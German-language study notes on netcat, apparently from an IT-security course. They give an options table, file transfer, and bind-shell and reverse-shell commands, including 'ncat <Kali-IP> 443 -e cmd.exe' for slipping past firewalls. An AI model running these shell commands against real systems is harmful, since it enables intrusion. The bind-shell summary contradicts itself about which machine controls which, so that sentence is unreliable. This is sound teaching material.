---
Fach: "[[ITS]]"
Thema:
  - "[[Security]]"
---

| Optionen            | Beschreibung                                                                                                                                                                                                                                                      |
| ------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ``-4``              | Erzwingt die Nutzung von IPv4 (GNU-Netcat)                                                                                                                                                                                                                        |
| ``-6``              | Erzwingt die Nutzung von IPv6 (GNU-Netcat)                                                                                                                                                                                                                        |
| ``-d``              | Löst Netcat von der Konsole (Hintergrundbetrieb; unter Windows und bei aktuellen GNU-Netcat-Versionen verfügbar)                                                                                                                                                  |
| ``-D``              | Aktiviert die Option fürs Debugging von Sockets (GNU-Netcat)                                                                                                                                                                                                      |
| -h` (display help)  | Zeigt die Hilfe an (Befehle/Optionen mit Kurzbeschreibung)                                                                                                                                                                                                        |
| ``-i` (secs)        | Verzögerung in Sekunden für gesendete Zeilen oder gescannte Ports                                                                                                                                                                                                 |
| ``-k``              | Netcat wartet nach Verbindungsende auf eine neue Verbindung (nur GNU-Netcat und nur in Verbindung mit „-l“ möglich)                                                                                                                                               |
| ``-l` (listen mode) | Lausch-/Listen- und Server-Modus für eingehende Verbindungsanfragen (über angegebenen Port)                                                                                                                                                                       |
| `-L` Listen harder  | Netcat wird veranlasst, auch nach clientseitigen Verbindungsabbrüchen weiterhin im Lauschmodus zu operieren (durchgängig mit den gleichen Parametern; wird nur von der Windows-Version unterstützt)                                                               |
| `-n` (numeric-only) | Nur IP-Nummern, keine DNS-Namen                                                                                                                                                                                                                                   |
| `-o` (file)         | Hex-Dump des Datenverkehrs wird durchgeführt (Inhalt von Dateien wird in hexadezimaler Ansicht dargestellt); dient der Fehlersuche (Debuggen von Netzanwendungen); Mitschneiden von Kommunikation (Sniffen) ist möglich (bei ausgehenden und eingehenden Paketen) |
| `-p` (port)         | Gibt den lokalen Quell-Port an, den Netcat für ausgehende Verbindungen nutzen soll                                                                                                                                                                                |
| `-r`                | Verwendung zufälliger Portwerte beim Scannen (für lokale und entfernte Ports)                                                                                                                                                                                     |
| `-s` (adress)       | Legt die lokale Quelladresse fest (IP-Adresse oder Namen)                                                                                                                                                                                                         |
| `-t`                | Telnet-Modus (ermöglicht z. B. Server-Ansprache über Telnet); erfordert eine spezielle Kompilierung von Netcat, ansonsten steht die Option nicht zur Verfügung                                                                                                    |
| `-u`                | Verwendung des UDP-Modus (statt TCP)                                                                                                                                                                                                                              |
| `-U` (gateway)      | Netcat verwendet Unix-Domain Sockets (GNU-Netcat)                                                                                                                                                                                                                 |
| `-v`                | Ausführliche Ausgabe (ist z. B. für die Anzeige und den Umfang angezeigter Fehlermeldungen verantwortlich)                                                                                                                                                        |
| `-w` (secs)         | Legt Time-outs fest: für den Verbindungsaufbau und für das Schließen einer Verbindung (Einheit: Sekunden)                                                                                                                                                         |
| `-z`                | Portscanner-Modus (zero-I/O mode); es wird nur nach lauschenden Diensten gescannt (kein Senden von Daten)                                                                                                                                                         |
# Connection
---
Client-Modus (connect to somewhere)
`nc [Optionen] [IP-Adresse/Hostname] [Port]`
Server-Modus (listen for inbound)
`nc -l -p port [options] [hostname] [port]`  
# Dateien übertragen
---
(Server) `nc -l -p 6790 > testdatei.txt`
(Client) `nc [IP Server] [port] < testdatei.txt`
# Shell Binding
---
**PC A**(Hier Kali)
`nc -lnvp <port> -e /bin/bash`
`-l`: lauschen (Listen) auf eingehende Verbindung  
`-n`: keine DNS-Auflösung (nur IPs)  
`-v`: verbose (mehr Ausgaben)  
`-p <port>`: bestimmter Port  
`-e /bin/bash`: führt nach Verbindungsaufbau das Programm `/bin/bash` aus und leitet dessen Ein-/Ausgabe auf die Netzwerkverbindung gebunden ist.

**PC B**(Hier Windows)
`nc <Server IP> <port>`
verbindet sich zu IP + Port des Servers

Ergebnis:
PC B bekommt eine **Shell von PC A** (bash), die über das Netzwerk gesteuert wird.
So kann PC A Befehle auf PC B ausführen.
# Reverse Shell
---
Eingehende Verbindungen werden oft von Firewalls blockiert.
Ausgehende Verbindungen über Port 80/443 (HTTP/HTTPS) sind fast immer erlaubt.
Reverse-Shell nutzt das aus:
  - Zielsystem baut selbst eine Verbindung nach außen (zum Angreifer) auf
  - Über diese Verbindung wird eine Shell (cmd.exe / bash) „getunnelt“

### Verwendung
**Angreifer** (Hier Kali):
`ncat -lnvp 443`
Erklärung:
`-l`: lauschen (listen)
`-n`: keine DNS-Auflösung
`-v`: verbose
`-p 443`: Port 443

Funktion:
- Kali wartet auf eingehende Verbindungen auf Port 443.

**Zielsystem** (Hier Windows):
`ncat <Kali-IP> 443 -e cmd.exe`
Erklärung:
Verbindet sich zu Kali auf Port 443.
`-e cmd.exe`: führt nach Verbindungsaufbau `cmd.exe` aus
Ein- und Ausgabe der cmd.exe werden über die Netzwerkverbindung geleitet.

Ergebnis:
- Auf Kali erscheint eine Windows-Kommandozeile (cmd.exe).
- Du kannst von Kali aus Befehle auf dem Windows-System ausführen.